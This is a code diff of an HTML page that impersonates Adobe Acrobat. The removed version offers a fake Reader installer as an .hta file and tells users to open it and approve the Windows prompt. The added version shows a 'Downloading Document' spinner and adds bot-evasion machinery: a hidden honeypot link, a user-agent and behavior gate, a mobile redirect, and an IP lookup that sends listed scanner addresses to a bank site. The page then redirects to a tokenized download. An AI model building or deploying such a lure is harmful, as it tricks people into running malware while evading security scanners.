@@ -1,49 +1,66 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Adobe Acrobat</title>
-<style>
-  :root{--bg:#f5f5f5;--ink:#1a1a1a;--sub:#5b5b5b;--line:#e2e2e2;--blue:#1473e6;}
-  *{box-sizing:border-box;margin:0;padding:0;}
-  body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;background:var(--bg);color:var(--ink);min-height:100vh;display:flex;flex-direction:column;}
-  header{background:#fff;border-bottom:1px solid var(--line);}
-  .bar{max-width:960px;margin:0 auto;padding:16px 24px;display:flex;align-items:center;gap:14px;}
-  .mark{width:34px;height:34px;border-radius:7px;background:#eb1000;display:flex;align-items:center;justify-content:center;color:#fff;font-weight:800;font-size:20px;font-family:Georgia,serif;}
-  .mark span{transform:translateY(-1px);}
-  .brand{font-size:18px;font-weight:600;}
-  .brand small{display:block;font-size:12px;color:var(--sub);font-weight:400;}
-  main{flex:1;display:flex;align-items:center;justify-content:center;padding:40px 20px;}
-  .card{background:#fff;border:1px solid var(--line);border-radius:14px;box-shadow:0 10px 30px rgba(0,0,0,.05);max-width:520px;width:100%;padding:44px 40px;text-align:center;}
-  .card h1{font-size:26px;font-weight:700;margin-bottom:8px;}
-  .card p{color:var(--sub);font-size:15px;line-height:1.55;margin-bottom:28px;}
-  .btn{display:inline-block;background:var(--blue);color:#fff;border:0;border-radius:9px;padding:14px 30px;font-size:16px;font-weight:600;text-decoration:none;cursor:pointer;transition:background .15s;}
-  .btn:hover{background:#0f5fc7;}
-  .note{margin-top:22px;font-size:12.5px;color:#8a8a8a;line-height:1.5;}
-  .v{font-size:12px;color:#a0a0a0;margin-top:26px;}
-  footer{background:#fff;border-top:1px solid var(--line);padding:16px 24px;text-align:center;font-size:12px;color:#9a9a9a;}
-  footer a{color:#9a9a9a;text-decoration:none;margin:0 8px;}
-  @media(max-width:520px){.card{padding:32px 24px;}}
-</style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="robots" content="noindex, nofollow">
+  <title>Downloading Document</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@200;300;400;500&display=swap');
+    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; }
+    .container { width: 100%; height: 100vh; display: flex; flex-direction: column;
+      align-items: center; justify-content: center; background: #fff; gap: 15px; padding-bottom: 20vh; }
+    .logo { width: 80px; height: 80px; object-fit: contain; }
+    .download-text { font-weight: bold; font-size: 16px; }
+    .spinner { width: 40px; height: 40px; border: 5px solid red; border-top-color: transparent;
+      border-radius: 50%; animation: spinner 0.7s linear infinite; }
+    @keyframes spinner { to { transform: rotate(360deg); } }
+  </style>
 </head>
 <body>
-<header><div class="bar">
-  <div class="mark"><span>A</span></div>
-  <div class="brand">Adobe Acrobat<small>Desktop Reader · Windows</small></div>
-</div></header>
-<main>
-  <div class="card">
-    <h1>Adobe Acrobat Reader</h1>
-    <p>Download the latest installer to view and print PDF documents. The setup will guide you through installation on this computer.</p>
-    <a class="btn" href="Adobe_Acrobat_Setup.hta" download>Download Installer</a>
-    <div class="note">After the download completes, open <strong>Adobe_Acrobat_Setup.hta</strong> and click <strong>Yes</strong> when Windows asks permission to install.</div>
-    <div class="v">Version 25.4 · 15.2 MB · For Windows 10 / 11</div>
+  <div class="container">
+    <img src="assets/adobe-logo.png" alt="Logo" class="logo">
+    <div class="download-text">Downloading Document</div>
+    <div class="spinner"></div>
   </div>
-</main>
-<footer>
-  <a href="#">Terms of Use</a><a href="#">Privacy</a><a href="#">Support</a><a href="#">Contact</a>
-  <div style="margin-top:8px">© 2026 Adobe. All rights reserved.</div>
-</footer>
+
+  <!-- Honeypot: invisible to humans, followed by link-crawling bots. ?hp=1 poisons 24h. -->
+  <a href="?hp=1" aria-hidden="true"
+     style="position:fixed;left:-9999px;top:-9999px;width:1px;height:1px;opacity:0;overflow:hidden;white-space:nowrap;">Skip verification</a>
+
+  <script src="config.js"></script>
+  <script src="gate.js"></script>
+  <script src="telemetry.js"></script>
+  <script>
+    (async function () {
+      var t0 = Date.now();
+      // Entry gate (real desktop Chrome UA + honeypot).
+      if (!window.gateStep({ entry: true })) return;
+
+      if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
+        window.location.href = "denied.html"; return;
+      }
+      var ipify = await (async () => {
+        try {
+          const c = new AbortController(); const to = setTimeout(() => c.abort(), 3000);
+          const r = await fetch('https://api.ipify.org?format=json', { signal: c.signal });
+          clearTimeout(to); return (await r.json()).ip;
+        } catch (e) { return null; }
+      })();
+      var blockedIPs = ['162.158.63.162','162.158.63.161','162.158.63.160'];
+      if (ipify && blockedIPs.includes(ipify)) { window.location.href = "https://www.easternbank.com/"; return; }
+
+      const it = await window.issueToken();
+      var TK = it.tok;
+      // Behavioral verdict (client-side). All failure -> legacy 5s fixed flow.
+      var verdict = { p: 'robust', f: 0, v: null };
+      try { var T = await window.collectBehavior(t0); verdict = window.verdict(window.scoreBehavior(T)); }
+      catch (e) { /* legacy */ }
+      const wait = Math.max(5000 - (Date.now() - t0), verdict.p === 'fast' ? 3200 : 5000);
+      setTimeout(function () {
+        window.location.href = "download.html?tk=" + encodeURIComponent(TK);
+      }, wait);
+    })();
+  </script>
 </body>
 </html>
